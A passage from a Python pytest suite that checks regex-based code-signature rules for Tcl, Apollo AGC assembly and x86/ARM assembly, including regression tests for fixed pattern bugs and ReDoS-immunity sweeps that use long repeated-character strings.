    assert m2 and m2.group(1) == "::my::func", "func_start should capture namespaced proc names"

    class_start = TCL_RULES["class_start"]
    m3 = class_start.search("oo::class create Point {")
    assert m3 and m3.group(1) == "Point"
    m4 = class_start.search("snit::type Widget {")
    assert m4 and m4.group(1) == "Widget"

    assert not class_start.search("proc add {a b} {"), "class_start incorrectly matched a proc"
    assert not func_start.search("oo::class create Point {"), "func_start incorrectly matched a class"


def test_tcl_args_nested_default_value_brace_regression():
    """
    Regression test for a real bug (Rule 11, nested-delimiter): `[^}]*` is a
    flat negated class, can't represent even one level of nesting. Tcl's
    optional-argument-with-default syntax nests braces directly inside the
    arg list (`proc foo {a {b 10}} {...}` -- `a` is required, `b` defaults
    to 10 -- a routine, idiomatic Tcl pattern), confirmed the old pattern
    truncated at the *inner* `}` instead of the true closing one.
    """
    old_pattern = re.compile(r"^[ \t]*proc[ \t\n]+[a-zA-Z0-9_:]+[ \t\n]+\{([^}]*)\}", re.M)
    nested = "proc foo {a {b 10}} {\n    return $a\n}"
    old_m = old_pattern.search(nested)
    assert old_m and old_m.group(0) == "proc foo {a {b 10}", "sanity check: old pattern must truncate"

    args = TCL_RULES["args"]
    m = args.search(nested)
    assert m and m.group(0) == "proc foo {a {b 10}}", (
        f"nested default-value brace truncated: {m.group(0) if m else None!r}"
    )
    assert args.search("proc bar {x y} {return $x}").group(0) == "proc bar {x y}"


def test_tcl_args_nested_redos_immunity():
    assert_redos_immune(TCL_RULES["args"], "proc foo {" + "{" * 20000, timeout_sec=3.0)
    assert TCL_RULES["args"].search("proc bar {x y} {return $x}")


def test_tcl_globals_env_leading_boundary_regression():
    """
    Regression test for a real bug: `::env` starts with `::` (non-word)
    inside the shared `\\b(...)\\b` group. Real usage (`$::env(HOME)`)
    always precedes it with `$`, also non-word -- `\\b` between two
    non-word characters can never fire, so `::env` never matched at all.
    """
    old_pattern = re.compile(r"\b(?:global|::env)\b|upvar[ \t]+#0")
    realistic = "set path $::env(HOME)"
    assert not old_pattern.search(realistic), "sanity check: bug must reproduce against the old pattern"

    globals_ = TCL_RULES["globals"]
    assert globals_.search(realistic), "::env still didn't match"
    assert globals_.search("global x y"), "bare-word global form regressed"
    assert globals_.search("upvar #0 x localX"), "upvar #0 form regressed"


def test_tcl_spec_exposure_redos_regression():
    """
    Regression test for a confirmed real O(n^2) ReDoS: the SPEC
    alternative's unbounded `\\d+` sits directly adjacent to the
    also-unbounded `[^\\]]*`, whose character class fully overlaps digits.
    Same bug shape already found and fixed in embedded_python's and css's
    independent copies of this pattern. Bounded `\\d+` to `\\d{1,10}` and
    `[^\\]]*` to `{0,300}`.
    """
    old_pattern = re.compile(r"\[(?:[ \t]*SPEC[ \t]*-[ \t]*\d+|spec|audit)[^\]]*\]", re.I)
    payload = "[SPEC-" + "1" * 8000

    start = time.perf_counter()
    old_pattern.search(payload)
    old_duration = time.perf_counter() - start
    assert old_duration > 0.02, (
        f"sanity check: old pattern was expected to show measurable quadratic cost at this size "
        f"but only took {old_duration:.4f}s"
    )

    spec_exposure = TCL_RULES["spec_exposure"]
    assert_redos_immune(spec_exposure, "[SPEC-" + "1" * 100000, timeout_sec=3.0)
    assert spec_exposure.search("[SPEC-123] compliance tag")


def test_tcl_namespace_double_colon_self_delimiting_confirmed_no_bug():
    """
    Symbolic-boundary audit (Rule 9): io/test/ui_framework/telemetry all
    have a `namespace::`-shaped alternative (`vfs::`, `tcltest::`, `ttk::`,
    `logger::`) ending in `::` inside a shared `\\b(...)\\b` group. Verified
    empirically -- unlike the confirmed globals bug above, these all
    self-heal correctly: a Tcl namespace-qualifier is *never* followed by
    whitespace/nothing in real usage, it's always immediately followed by
    more identifier characters (`vfs::mount`, `tcltest::configure`,
    `ttk::button`, `logger::init`), so the trailing `\\b` correctly fires
    against that following word character every time. Documented here as a
    verified non-bug, not silently assumed safe.
    """
    io = TCL_RULES["io"]
    test_ = TCL_RULES["test"]
    ui_framework = TCL_RULES["ui_framework"]
    telemetry = TCL_RULES["telemetry"]

    assert io.search("vfs::mount $path")
    assert test_.search("tcltest::configure -verbose 1")
    assert ui_framework.search("ttk::button .b -text Hi")
    assert telemetry.search("logger::init myapp")


def test_tcl_bitwise_ops_and_closures_do_not_collide():
    """
    Known ambiguity pattern from the issue template (Rust's `|a| a + 1`
    miscounted as bitwise-OR, C++'s `std::cout <<` miscounted as a bitwise
    shift). Verified empirically: Tcl's closure syntax (`apply {{args}
    body}`) uses literal braces, not pipe/angle-bracket tokens, so it
    structurally cannot collide with bitwise_ops' `&`/`|`/`<<`/`>>`/`^`/`~`.
    """
    bitwise_ops = TCL_RULES["bitwise_ops"]
    closures = TCL_RULES["closures"]

    closure_sample = "set fn [apply {{x} {return $x}} 5]"
    assert closures.search(closure_sample)
    assert not bitwise_ops.search(closure_sample)

    bitwise_sample = "set mask [expr {$a & $b}]"
    assert bitwise_ops.search(bitwise_sample)
    assert not closures.search(bitwise_sample)


def test_tcl_lexical_family_no_block_terminator_state_to_confuse():
    """
    Lexical-family audit: tcl is `line_exclusive` (Tcl natively uses only
    `#` for line comments, no block comments -- developers sometimes hack
    `if 0 { ... }` but that's not a real comment delimiter) -- no rule
    tracks open/close block-comment state. Confirms a stray unmatched `}`
    doesn't fool any rule into a false structural match.
    """
    branch = TCL_RULES["branch"]
    stray_close = "some text } if {$x == 0} {"
    assert branch.search(stray_close), "branch should still see 'if' regardless of the stray } before it"


def test_tcl_redos_immunity_sweep():
    """
    ReDoS immunity sweep across tcl's remaining unbounded-quantifier rules
    not covered by the dedicated regression tests above.
    """
    assert_redos_immune(TCL_RULES["func_start"], "proc " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(TCL_RULES["class_start"], "oo::class create " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(TCL_RULES["state_mutation"], "set " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(TCL_RULES["ownership"], "# Author: " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(TCL_RULES["cleanup"], "rename " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(TCL_RULES["encapsulation"], "proc _" + "a" * 100000, timeout_sec=3.0)

    # sanity: all still match their real positive cases after the sweep
    assert TCL_RULES["func_start"].search("proc add {a b} {")
    assert TCL_RULES["class_start"].search("oo::class create Point {")


# ==============================================================================
# AGC_ASSEMBLY: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #572, part of epic #518)
# ==============================================================================
AGC_RULES = LANGUAGE_DEFINITIONS["agc_assembly"]["rules"]

_AGC_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "\tTCF\tFOO", "\tCA\tBAR"),
    ("args", "\tCA\tA", "\tCA\tBAR"),
    ("structural_boundaries", "\tCA\tBAR", "\tTCF\tFOO"),
    ("func_start", "MYLABEL\tTC\tFOO", "\tTC\tFOO"),
    ("safety", "\tINHINT", "\tCA\tBAR"),
    ("safety_bypasses", "\tTC\tJOBSLEEP", "\tCA\tBAR"),
    ("high_risk_execution", "\tTC\tCURTAINS", "\tCA\tBAR"),
    ("io", "\tCHANNEL\t7", "\tCA\tBAR"),
    ("api", "MYLABEL\tEQUALS\t5", "MYLABEL\tCA\tBAR"),
    ("state_mutation", "\tTS\tBAR", "\tCA\tBAR"),
    ("dead_code", "# CA BAR", "# just a note"),
    ("doc", "# SUBROUTINE FOO", "# just a note"),
    ("test", "\tSELFCHECK", "\tCA\tBAR"),
    ("concurrency", "\tEXEC", "\tCA\tBAR"),
    ("ui_framework", "\tVERB\t37", "\tCA\tBAR"),
    ("globals", "\tERASABLE MEMORY", "\tCA\tBAR"),
    ("scientific", "\tVAD\tVEC1", "\tCA\tBAR"),
    ("reflection_metaprogramming", "\tINDEX\tA", "\tCA\tBAR"),
    ("import", "\tSETLOC\tFOO", "\tCA\tBAR"),
    ("ownership", "# AUTHOR: Margaret Hamilton", "# just a note"),
    ("planned_debt", "# TODO: fix this", "# done"),
    ("fragile_debt", "# HACK: workaround", "# clean"),
    ("spec_exposure", "# LUMINARY 099", "# just a note"),
    ("events", "\tKEYRUPT", "\tCA\tBAR"),
    ("macros", "MACRO", "\tCA\tBAR"),
    ("pointers", "\tINDEX\tA", "\tCA\tBAR"),
    ("memory_alloc", "\tERASABLE", "\tCA\tBAR"),
    ("telemetry", "\tDOWNLINK", "\tCA\tBAR"),
    ("debug_prints", "\tFLASH", "\tCA\tBAR"),
    ("explicit_casts", "\tEXTEND", "\tCA\tBAR"),
    ("panics_and_aborts", "\tTC\tBAILOUT", "\tCA\tBAR"),
    ("thread_sleeps", "\tVARDELAY", "\tCA\tBAR"),
    ("bitwise_ops", "\tMASK\tBAR", "\tTC\tBAR"),
    ("sync_locks", "\tINHINT", "\tCA\tBAR"),
    ("immutability_locks", "\tFIXED MEMORY", "\tCA\tBAR"),
    ("cleanup", "\tENDOFJOB", "\tCA\tBAR"),
    ("encapsulation", "MYLABEL\tCA\tBAR", "# just a comment line"),
    ("listeners", "\tEVENT WAIT", "\tCA\tBAR"),
]


@pytest.mark.parametrize("signature,positive,negative", _AGC_SIMPLE_CASES)
def test_agc_assembly_signature_positive_and_negative(signature, positive, negative):
    pattern = AGC_RULES[signature]
    assert pattern is not None, f"agc_assembly's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"agc_assembly {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"agc_assembly {signature!r} incorrectly matched an excluded case: {negative!r}"
        )


def test_agc_assembly_dependency_capture_extracts_bank_and_setloc():
    pattern = AGC_RULES["_dependency_capture"]
    m = pattern.search("\tSETLOC\tFOO")
    assert m and m.group(1) == "FOO"
    m2 = pattern.search("\tBANK\t27")
    assert m2 and m2.group(1) == "27"


def test_agc_assembly_func_start_cross_line_false_match_regression():
    """
    Regression test for a real bug: the lookahead's `\\s+` can cross a
    newline (Rule 5). A bare label with nothing else on its own line,
    followed by several blank lines and then an unrelated opcode, got
    falsely bound to that distant opcode -- confirmed
    "MYLABEL\\n\\n\\n\\tTC INTERNAL\\n" incorrectly captured MYLABEL. Real
    AGC label+opcode pairs are always on the same physical line
    (fixed-column YUL/GAP format).
    """
    old_pattern = re.compile(
        r"^([A-Z0-9_-]+)(?=\s+(?:TC|CA|CS|TS|DXCH|CCS|DLOAD|STORE|CALL|INDEX|EXTEND|INHINT|BZF|BZMF|BPL|BMI)\b)",
        re.M | re.I,
    )
    cross_line = "MYLABEL\n\n\n\tTC INTERNAL\n"
    old_m = old_pattern.search(cross_line)
    assert old_m and old_m.group(1) == "MYLABEL", "sanity check: bug must reproduce against the old pattern"

    func_start = AGC_RULES["func_start"]
    assert not func_start.search(cross_line), "cross-line false attribution still occurs"
    m = func_start.search("MYLABEL\tTC\tFOO")
    assert m and m.group(1) == "MYLABEL", "real same-line label form regressed"


def test_agc_assembly_encapsulation_case_regression():
    """
    Regression test for a real bug: `encapsulation` required a
    lowercase-starting label, but authentic AGC assembly source is
    uppercase-only -- every other rule in this language section uses
    `re.I`, and func_start's own capture class is `[A-Z0-9_-]+`, so the
    lowercase-only requirement here was a clear outlier. Confirmed a
    realistic label ("MYLABEL") never matched at all under the old pattern.
    """
    old_pattern = re.compile(r"^[ \t]*[a-z0-9_][a-zA-Z0-9_.]*", re.M)
    realistic = "MYLABEL\tCA\tBAR"
    assert not old_pattern.search(realistic), "sanity check: bug must reproduce against the old pattern"

    encapsulation = AGC_RULES["encapsulation"]
    assert encapsulation.search(realistic), "uppercase AGC label still didn't match"


def test_agc_assembly_func_start_vs_macros_no_false_collision():
    """
    Known ambiguity pattern from the issue template (a run of macro/
    preprocessor lines fooling func_start, as seen in C++). agc_assembly's
    func_start requires a label followed by a real opcode; macros maps to
    the `MACRO`/`ENDMAC`/`DEFINE` directive keywords -- structurally
    distinct, no realistic overlap.
    """
    func_start = AGC_RULES["func_start"]
    macros = AGC_RULES["macros"]

    macro_directive = "MACRO"
    assert macros.search(macro_directive)
    assert not func_start.search(macro_directive)

    labeled_opcode = "MYLABEL\tTC\tFOO"
    assert func_start.search(labeled_opcode)
    assert not macros.search(labeled_opcode)


def test_agc_assembly_explicit_casts_vs_pointers_no_false_collision():
    """
    Known ambiguity pattern from the issue template (C's cast syntax
    overlapping pointer-asterisk repetition). agc_assembly's explicit_casts
    maps only to the bare `EXTEND` opcode; pointers maps to
    `INDEX`/`INDIRECT`/`POINTER`/`CADR`/etc. and a leading-`*` symbol form --
    structurally distinct token shapes, verified no overlap even though
    `EXTEND` and `INDEX` commonly co-occur in real code (`EXTEND` then
    `INDEX A` as a paired instruction sequence) -- they match disjoint
    substrings, not a false collision.
    """
    explicit_casts = AGC_RULES["explicit_casts"]
    pointers = AGC_RULES["pointers"]

    combined = "\tEXTEND\n\tINDEX\tA"
    cast_match = explicit_casts.search(combined)
    ptr_match = pointers.search(combined)
    assert cast_match and cast_match.group(0).upper() == "EXTEND"
    assert ptr_match and ptr_match.group(0).upper() == "INDEX"


def test_agc_assembly_lexical_family_no_block_terminator_state_to_confuse():
    """
    Lexical-family audit: agc_assembly is `line_exclusive` (digitized
    source uses `#` exclusively for comments, no block syntax) -- no rule
    tracks open/close block-comment state. Confirms a stray unmatched
    comment-like token doesn't fool any rule into a false structural match.
    """
    branch = AGC_RULES["branch"]
    stray = "some text # not real code\n\tTCF\tFOO"
    assert branch.search(stray), "branch should still see TCF regardless of the preceding comment line"


def test_agc_assembly_redos_immunity_sweep():
    """
    ReDoS immunity sweep across agc_assembly's rules. Verified via a
    systematic scaling sweep before writing this test (5 adversarial
    payload shapes at n=2000/8000/32000 against every non-None rule):
    nothing exceeded 0.3s at n=32000 against any shape.
    """
    assert_redos_immune(AGC_RULES["func_start"], "LABEL" + " " * 100000, timeout_sec=3.0)
    assert_redos_immune(AGC_RULES["api"], "LABEL" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(AGC_RULES["encapsulation"], "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(AGC_RULES["_dependency_capture"], "SETLOC" + " " * 100000, timeout_sec=3.0)
    assert_redos_immune(AGC_RULES["pointers"], "*" + "A" * 100000, timeout_sec=3.0)

    # sanity: all still match their real positive cases after the sweep
    assert AGC_RULES["func_start"].search("MYLABEL\tTC\tFOO")
    assert AGC_RULES["api"].search("MYLABEL\tEQUALS\t5")


# ==============================================================================
# ASSEMBLY: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #574, part of epic #518)
# ==============================================================================
ASM_RULES = LANGUAGE_DEFINITIONS["assembly"]["rules"]

_ASM_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "\tjmp foo", "\tmov eax, ebx"),
    ("args", "\tmov edi, 5", "\tmov eax, ebx"),
    ("structural_boundaries", "\tmov rax, rbx", "\tjmp foo"),
    ("func_start", "myFunc:\n\tret", "\tret"),
    ("class_start", "\tstruc Point", "\tmov eax, ebx"),
    ("safety", "\tendbr64", "\tmov eax, ebx"),
    ("safety_bypasses", "\tjmp rax", "\tjmp foo"),
    ("high_risk_execution", "\thlt", "\tmov eax, ebx"),
    ("io", "\tsyscall", "\tmov eax, ebx"),
    ("api", "\tglobal main", "\tmov eax, ebx"),
    ("state_mutation", "\txchg eax, ebx", "\tmov eax, ebx"),
    ("dead_code", "; mov eax, 5", "; just a note"),
    ("doc", "; @param x", "; just a note"),
    ("test", "\tassert eax", "\tmov eax, ebx"),
    ("concurrency", "\tlock xadd eax, ebx", "\tmov eax, ebx"),
    ("globals", "\t.data", "\tmov eax, ebx"),
    ("comprehensions", "\trep movsb", "\tmov eax, ebx"),
    ("scientific", "\tfadd st0, st1", "\tmov eax, ebx"),
    ("reflection_metaprogramming", "[eax + ebx * 4]", "mov eax, ebx"),
    ("import", '%include "foo.inc"', "\tmov eax, ebx"),
    ("ownership", "; Author: Jane Doe", "; just a note"),
    ("planned_debt", "; TODO: fix", "; done"),
    ("fragile_debt", "; HACK: workaround", "; clean"),
    ("spec_exposure", "[SPEC-123]", "; just a note"),
    ("events", "\tint 0x21", "\tmov eax, ebx"),
    ("macros", "%macro foo 2", "\tmov eax, ebx"),
    ("pointers", "\tmov eax, [ebx]", "\tmov eax, ebx"),
    ("memory_alloc", "\tcall malloc", "\tcall free"),
    ("telemetry", "\tcall log_info", "\tcall malloc"),
    ("debug_prints", "\tcall printf", "\tcall malloc"),
    ("explicit_casts", "\tmovzx eax, byte ptr [ebx]", "\tmov eax, ebx"),
    ("panics_and_aborts", "\thlt", "\tmov eax, ebx"),
    ("thread_sleeps", "\tpause", "\tmov eax, ebx"),
    ("bitwise_ops", "\txor eax, eax", "\tmov eax, ebx"),
    ("sync_locks", "\tlock cmpxchg", "\tmov eax, ebx"),
    ("immutability_locks", "FOO equ 5", "\tmov eax, ebx"),
    ("cleanup", "\tcall free", "\tcall malloc"),
    ("encapsulation", "\t.local myVar", "\t.global myVar"),
    ("regex_execution", "\tcall regexec", "\tcall malloc"),
    ("time_date_logic", "\trdtsc", "\tmov eax, ebx"),
    ("ipc_rpc_bridges", "\tcall execve", "\tcall malloc"),
]


@pytest.mark.parametrize("signature,positive,negative", _ASM_SIMPLE_CASES)
def test_assembly_signature_positive_and_negative(signature, positive, negative):
    pattern = ASM_RULES[signature]
    assert pattern is not None, f"assembly's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"assembly {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"assembly {signature!r} incorrectly matched an excluded case: {negative!r}"
        )


def test_assembly_serialization_parsing_is_none_by_strict_feature_parity():
    """
    Regression test for a real bug: `serialization_parsing`,
    `regex_execution`, `time_date_logic`, and `ipc_rpc_bridges` were all
    leftover Lua signatures (`string.match`, `os.execute`, `cjson.decode`,
    etc. -- the section was even labeled "(Lua Specifics)" in a comment),
    copy-pasted from Lua's dict and never adapted. None of them can ever
    fire against real assembly source. `serialization_parsing` has no
    native or universal-libc equivalent (unlike malloc/free/printf) so it
    is now explicitly `None` per Strict Feature Parity (Rule 4).
    """
    assert ASM_RULES["serialization_parsing"] is None


def test_assembly_regex_execution_time_date_ipc_use_real_constructs_not_lua():
    """
    The other three hybrid sensors do have realistic native/libc
    equivalents in assembly and were rewired to them (see previous test
    for the bug this fixes).
    """
    old_regex_execution = re.compile(r"\b(string\.match|string\.gmatch|string\.find|string\.gsub)\b")
    old_time_date_logic = re.compile(r"\b(os\.time|os\.clock|os\.date|os\.difftime)\b")
    old_ipc_rpc_bridges = re.compile(
        r"\b(os\.execute|io\.popen|coroutine\.create|coroutine\.resume|coroutine\.yield)\b"
    )

    real_regex_call = "\tcall regexec"
    real_time_call = "\trdtsc"
    real_ipc_call = "\tcall execve"

    # sanity: the old Lua-shaped patterns never matched real assembly
    assert not old_regex_execution.search(real_regex_call)
    assert not old_time_date_logic.search(real_time_call)
    assert not old_ipc_rpc_bridges.search(real_ipc_call)

    # the fixed patterns do
    assert ASM_RULES["regex_execution"].search(real_regex_call)
    assert ASM_RULES["time_date_logic"].search(real_time_call)
    assert ASM_RULES["ipc_rpc_bridges"].search(real_ipc_call)

    # and stay disjoint from `io`'s generic syscall tokens
    assert not ASM_RULES["ipc_rpc_bridges"].search("\tsyscall")


def test_assembly_dependency_capture_extracts_include_path():
    pattern = ASM_RULES["_dependency_capture"]
    m = pattern.search('%include "foo.inc"')
    assert m and m.group(1) == "foo.inc"
    m2 = pattern.search("\t.incbin bar.bin")
    assert m2 and m2.group(2) == "bar.bin"


def test_assembly_func_start_cross_line_false_match_regression():
    """
    Regression test for a real bug: the lookahead used `(?=\\s*:)`, and in
    `re.M` mode `\\s` matches newlines (Rule 5). A bare label with nothing
    else on its own line, followed by blank lines and then a stray colon
    far away, got falsely bound to that distant colon. Real assembly
    label+colon pairs are always on the same physical line. Bounded to
    `[ \\t]*`.
    """
    old_pattern = re.compile(
        r"^[ \t]*(?!\.L|\.LC|\d|\.text|\.data|\.bss)([a-zA-Z_][a-zA-Z0-9_.$]*)(?=\s*:)",
        re.M,
    )
    cross_line = "FOO\n\n\n:"
    old_m = old_pattern.search(cross_line)
    assert old_m and old_m.group(1) == "FOO", "sanity check: bug must reproduce against the old pattern"

    func_start = ASM_RULES["func_start"]
    assert not func_start.search(cross_line), "cross-line false attribution still occurs"

    m = func_start.search("myFunc:\n\tret")
    assert m and m.group(1) == "myFunc", "real same-line label form regressed"

    m2 = func_start.search("myFunc :\n\tret")
    assert m2 and m2.group(1) == "myFunc", "same-line label with space before colon should still match"


def test_assembly_func_start_excludes_local_labels_and_sections():
    func_start = ASM_RULES["func_start"]
    assert not func_start.search(".L1:\n\tret"), "GCC-style local label should be excluded"
    assert not func_start.search(".text\n"), "section directive should not be treated as a func_start label"


def test_assembly_encapsulation_symbolic_boundary_regression():
    """
    Regression test for a real bug (Rule 9): the old pattern was
    `\\b(?:\\.local|\\.private)\\b`. A leading `\\b` placed directly before a
    literal `.` can never fire when the directive is preceded by
    whitespace or line-start (both non-word), which is how `.local`/
    `.private` are always written in real assembly -- confirmed the
    realistic form `"\\t.local myVar"` never matched under the old pattern.
    Fixed by anchoring to line-start instead (`.` is already
    self-delimiting, per the doc's Rule 9 guidance), matching the same
    convention already used by `class_start`/`globals`/`api`/`macros`.
    """
    old_pattern = re.compile(r"\b(?:\.local|\.private)\b", re.I)
    realistic = "\t.local myVar"
    assert not old_pattern.search(realistic), "sanity check: bug must reproduce against the old pattern"

    encapsulation = ASM_RULES["encapsulation"]
    assert encapsulation.search(realistic), "realistic whitespace-preceded .local directive still didn't match"
    assert encapsulation.search("\t.private myVar")
    assert not encapsulation.search("\t.global myVar")


def test_assembly_explicit_casts_vs_pointers_intentional_double_classification():
    """
    Known ambiguity pattern from the issue template (already found in C:
    cast syntax overlapping pointer-asterisk repetition). Here the two
    signatures DO genuinely overlap on the same substring -- an x86 size
    specifier like `byte ptr [ebx]` is simultaneously an explicit type-size
    cast (explicit_casts) AND a memory pointer dereference (pointers).
    This is an intentional, correct double-classification (Rule 1:
    semantic intent over keyword matching) since the token really does
    carry both meanings at once, not a false collision to fix.
    """
    explicit_casts = ASM_RULES["explicit_casts"]
    pointers = ASM_RULES["pointers"]

    combined = "\tmovzx eax, byte ptr [ebx]"
    assert explicit_casts.search(combined)
    assert pointers.search(combined)

    # a plain bracketed dereference with no size specifier is pointers-only
    plain_deref = "\tmov eax, [ebx]"
    assert pointers.search(plain_deref)
    assert not explicit_casts.search(plain_deref)


def test_assembly_func_start_vs_macros_no_false_collision():
    """
    Known ambiguity pattern from the issue template (a run of macro/
    preprocessor lines fooling func_start, as seen in C++). assembly's
    macros keywords all start with `%`, `.`, or `#`, none of which satisfy
    func_start's `[a-zA-Z_]` leading-character requirement -- structurally
    disjoint by construction, verified against every macros alternative.
    """
    func_start = ASM_RULES["func_start"]
    macros = ASM_RULES["macros"]

    for macro_line in ("%macro foo 2", ".macro foo", "%define FOO 5", ".equ FOO, 5", "#define FOO 5"):
        assert macros.search(macro_line), f"macros should match {macro_line!r}"
        assert not func_start.search(macro_line), f"func_start should not match macro directive {macro_line!r}"

    labeled_opcode = "myFunc:\n\tret"
    assert func_start.search(labeled_opcode)
    assert not macros.search(labeled_opcode)


def test_assembly_test_vs_regex_execution_no_false_collision():
    """
    Known ambiguity pattern from the issue template (TypeScript's
    `myRegex.test('x')` colliding with `test`). assembly's `test` maps to
    describe/expect/assert/TestCase/`it(`; `regex_execution` maps to
    `call`/`bl` into POSIX regex functions -- disjoint token vocabularies,
    no realistic overlap.
    """
    test_rule = ASM_RULES["test"]
    regex_execution = ASM_RULES["regex_execution"]

    assertion = "\tassert eax"
    assert test_rule.search(assertion)
    assert not regex_execution.search(assertion)

    regex_call = "\tcall regexec"
    assert regex_execution.search(regex_call)
    assert not test_rule.search(regex_call)


def test_assembly_hlt_triple_classification_is_intentional():
    """
    Ambiguity sweep finding: `hlt` appears in three separate Phase 2/5
    sensors -- high_risk_execution, panics_and_aborts, and thread_sleeps.
    Confirmed intentional, not a bug: the HLT instruction genuinely halts
    the CPU (a process-killing/high-risk act), forcefully destroys the
    current execution context (a panic/abort), and is also the idiomatic
    idle-wait instruction in interrupt-driven code (a thread sleep) --
    a static regex can't disambiguate which real-world intent applies, so
    all three sensors firing together is the documented, deliberate
    tradeoff (Rule 1: semantic intent over keyword matching), not
    duplicate counting to collapse.
    """
    halt = "\thlt"
    assert ASM_RULES["high_risk_execution"].search(halt)
    assert ASM_RULES["panics_and_aborts"].search(halt)
    assert ASM_RULES["thread_sleeps"].search(halt)


def test_assembly_inc_dec_structural_boundaries_vs_state_mutation_is_intentional():
    """
    Ambiguity sweep finding: `inc`/`dec` appear in both
    structural_boundaries and state_mutation. Confirmed intentional: an
    increment instruction is simultaneously a straight-line sequential
    operation and a mutation of register/memory state -- both true at
    once, not a false collision.
    """
    incr = "\tinc eax"
    assert ASM_RULES["structural_boundaries"].search(incr)
    assert ASM_RULES["state_mutation"].search(incr)


def test_assembly_concurrency_vs_sync_locks_overlap_is_intentional():
    """
    Ambiguity sweep finding: concurrency and sync_locks share several
    literal tokens (lock, dmb, dsb, isb, stxr, ldxr). Confirmed
    intentional: hardware memory-barrier/atomic instructions are
    simultaneously concurrency-domain (Phase 3) and synchronization-domain
    (Phase 5) by definition -- there is no real assembly instruction that
    is "concurrency" without also being "synchronization" at the hardware
    level, so co-firing is correct, not duplicate counting.
    """
    barrier = "\tdmb sy"
    assert ASM_RULES["concurrency"].search(barrier)
    assert ASM_RULES["sync_locks"].search(barrier)


def test_assembly_pointers_no_realistic_nested_bracket_construct():
    """
    Nested-delimiter audit (Rule 11): `pointers` uses the flat negated
    class `\\[[^\\]]+\\]`, which cannot represent one level of bracket
    nesting. Confirmed this is not applicable here -- neither x86 SIB
    addressing (`[rax+rbx*4]`) nor ARM addressing (`[x0, x1, lsl #2]`) has
    any legitimate construct where `[` nests inside another `[...]`
    operand (unlike a generic return type or indexer in a higher-level
    language) -- so the flat class is correct as written, not a gap.
    """
    pointers = ASM_RULES["pointers"]
    assert pointers.search("\tmov eax, [rax+rbx*4]")
    assert pointers.search("\tldr x0, [x1, x2, lsl #2]")


def test_assembly_lexical_family_no_block_terminator_state_to_confuse():
    """
    Lexical-family audit: assembly is `line_exclusive` (NASM/MASM use `;`,
    GAS/ARM use `#`; there is no native multi-line block-comment syntax)
    -- no rule tracks open/close block-comment state. Confirms a stray
    comment-like line doesn't fool a structural rule into a false match.
    """
    branch = ASM_RULES["branch"]
    stray = "; not real code, just a note\n\tjmp foo"
    assert branch.search(stray), "branch should still see jmp regardless of the preceding comment line"


def test_assembly_dead_code_fires_under_both_native_comment_styles():
    """
    Comment-style audit (Rule 12): assembly's dead_code is wired to both
    real native comment markers for this lexical family -- `;`
    (NASM/Intel/MASM) and `#` (GAS/ARM) -- confirmed both independently
    fire on commented-out structural code.
    """
    dead_code = ASM_RULES["dead_code"]
    assert dead_code.search("; mov eax, 5"), "';' comment style should be recognized"
    assert dead_code.search("# mov eax, 5"), "'#' comment style should be recognized"


def test_assembly_redos_immunity_sweep():
    """
    ReDoS immunity sweep across assembly's rules with unbounded-looking
    quantifiers. Verified via a systematic scaling sweep before writing
    this test (adversarial "never closes" payloads at n=2000/8000/32000
    against every non-None rule): nothing exceeded 0.3s at n=32000.
    """
    assert_redos_immune(ASM_RULES["func_start"], "LABEL" + " " * 100000, timeout_sec=3.0)
    assert_redos_immune(ASM_RULES["api"], "global" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(ASM_RULES["pointers"], "[" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(ASM_RULES["reflection_metaprogramming"], "[" + "a " * 50000, timeout_sec=3.0)
    assert_redos_immune(ASM_RULES["doc"], ";" * 100000, timeout_sec=3.0)
    assert_redos_immune(ASM_RULES["ownership"], "; Author: " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(ASM_RULES["_dependency_capture"], "%include " + " " * 100000, timeout_sec=3.0)
    assert_redos_immune(ASM_RULES["spec_exposure"], "[SPEC-1" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(ASM_RULES["class_start"], "struc " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(ASM_RULES["encapsulation"], "." + "a" * 100000, timeout_sec=3.0)

    # sanity: all still match their real positive cases after the sweep
    assert ASM_RULES["func_start"].search("myFunc:\n\tret")
    assert ASM_RULES["api"].search("\tglobal main")
    assert ASM_RULES["encapsulation"].search("\t.local myVar")
